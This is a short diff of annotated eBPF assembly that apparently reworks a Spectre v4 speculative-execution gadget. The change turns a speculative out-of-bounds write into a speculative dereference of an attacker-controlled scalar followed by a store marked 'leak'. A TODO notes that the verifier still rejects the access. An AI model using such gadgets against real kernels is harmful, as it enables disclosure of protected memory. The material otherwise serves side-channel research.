@@ -224,17 +224,22 @@ LBB0_5:
 	# r10: frame pointer (fp)
 	# fp-64: not initialized (type STACK_INVALID)
 	#
-	r3 = 0
+	r3 = 4096 # addr to check
 	r2 = -64
 	r2 += r10
 	*(u64 *)(r2 - 0) = r3
+	*(u64 *)(r10 - 72) = r6
 	if r1 == 0 goto SCALAR_UNKNOWN  # branch based on user input
-	r2 = 80
+	r2 = -72
 	r2 += r10
-	if r1 == 0 goto END  # branch based on user input
+	if r1 != 0 goto END  # branch based on user input
 SCALAR_UNKNOWN:
-	# Spec. OOB Write to r10-80 followed by lfence (bec. v4):
-	*(u64 *)(r2 - 0) = r3         # fp[-64-{0,8}] = scalar
+	*(u64 *)(r2 - 0) = r3
+	r4 = *(u64 *)(r10 - 72) # spec. scalar
+	# TODO: R4 invalid mem access 'scalar'
+	r5 = *(u32 *)(r4 + 40) # spec. scalar deref
+	if r5 == 0 goto END # check
+	*(u32 *)(r7 + 20) = r1 # leak
 	#
 	# Spec. Gadget End
 	#
